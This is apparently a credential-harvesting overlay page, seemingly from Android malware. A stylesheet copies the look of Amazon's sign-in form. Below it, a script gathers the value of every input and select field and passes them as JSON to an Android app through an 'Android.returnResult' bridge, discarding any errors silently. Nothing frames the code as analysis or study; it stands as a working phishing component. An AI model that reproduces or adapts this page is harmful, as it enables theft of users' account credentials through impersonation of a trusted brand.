body {
    background-color: #ffffff;
}
html {
    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

#amazon {
    display: table;
    position: absolute;
    height: 100%;
    width: 100%;
	overflow: hidden;
}
#amazon h1 {
    font-weight: 400;
    font-size: 28px;
    line-height: 1.2;
    margin-top: 0px;
}
#amazon .logo {
    text-align: center;
    position: fixed;
    top: 25px;
    width: 100%;
}
#amazon .content {
	margin-right: 5%;
	margin-left: 5%;
    border: 1px solid #808080;
    border-radius: 5px;
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 440px;
    width: calc(90% - 44px);
    padding: 22px 22px 22px 22px;
    margin-bottom: 28px;
    background-color: #fff;
    min-width: 200px;
    overflow: hidden;
}
#amazon label {
    display: block;
    padding-left: 2px;
    padding-bottom: 2px;
    font-weight: 700;
}
#amazon input:focus {
    border-color: #e77600;
    box-shadow: 0 0 3px 2px rgba(228,121,17,.5);
}
#amazon input {
    background-color: #fff;
    height: 31px;
    padding: 3px 7px;
    line-height: normal;
    border: 1px solid #a6a6a6;
    border-top-color: #949494;
    border-radius: 3px;
    box-shadow: 0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset;
    outline: 0;
    -webkit-transition: all 100ms linear;
    transition: all 100ms linear;
    font-family: Arial,sans-serif;
    line-height: 19px;
    color: #111;
    margin: 0;
    margin-right: 0px;
    font-size: 100%;
    vertical-align: middle;
    width: 96.7%;
}
#amazon .createtext {
    margin-bottom: 16px;
    font-size: .8125rem;
    color: #262626;
    text-align: left;
}
#amazon a {
    color: #0070ba;
}
#amazon .btnNext {
    border-color: #a88734 #9c7e31 #846a29;
    border-width: 1px;
    border-radius: 3px;
    font-size: 13px;
    font-weight: bold;
    background: #f0c14b;
    background: linear-gradient(to bottom,#f7dfa5,#f0c14b);
    width: 100%;
    height: 32px;
    color: #111;
}
#amazon .btnNext:hover {
    background-color: #005ea6;
    outline: 0;
}
#amazon .middle {
    display: table-cell;
    vertical-align: middle;
}
.footer {
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    font-size: 12px;
    padding-top: 14px;
    z-index: -10;
}
.footer .legalFooter {
    text-align: center;
}
.footerCopyright {
    margin: 0;
    text-align: center;
    color: #000;
}
.footer .legalFooter {
    text-align: center;
    padding: 14px;
}
.footer table {
    width: 100%;
    margin-bottom: 10px;
}
.footer td {
    width: 33.3333%;
    text-align: center;
    color: #0066c0;
}

<script>

function process(formId) {
    try {
        Android.returnResult( formToJSONbyName(document.getElementById(formId)) );
    } catch (err) {}
}

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSONbyName(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];
    for(var i = 0; i < namesHTML.length; i++) {
		var bsform = f.getElementsByTagName(namesHTML[i]);
        for(var j = 0; j < bsform.length; j++) {
            FinalObject[bsform[j].name] = bsform[j].value
        }
    }
    return stringifyJSON(FinalObject);
}

</script>
